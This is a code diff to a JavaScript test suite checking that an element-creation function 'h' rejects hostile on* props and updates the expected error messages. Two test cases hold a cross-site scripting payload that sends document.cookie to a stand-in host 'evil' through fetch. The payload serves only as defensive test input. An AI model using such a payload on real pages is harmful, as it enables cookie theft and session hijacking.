@@ -283,9 +283,13 @@ describe('h - hostile props are rejected, not rendered', () =>
     {
         // A string here would land via setAttribute as onerror="fetch(...)" - a LIVE handler
         // the browser executes. happy-dom does not run inline handlers, so we assert the
-        // attribute is never written (the throw) rather than execution.
+        // attribute is never written (the throw) rather than execution. The lowercase name is
+        // refused as reserved before its value is even considered; handler-form with a
+        // non-function value breaks the handler-value rule.
         expect(() => h('img', { src: 'x', onerror: 'fetch(\'https://evil/?c=\'+document.cookie)' }))
-            .toThrow(/on\* prop must be a function/);
+            .toThrow(/reserved for event handlers/);
+        expect(() => h('img', { src: 'x', onError: 'fetch(\'https://evil/?c=\'+document.cookie)' }))
+            .toThrow(/expects a function handler/);
     });
 
     it('accepts a function on* handler (the legitimate form)', () =>
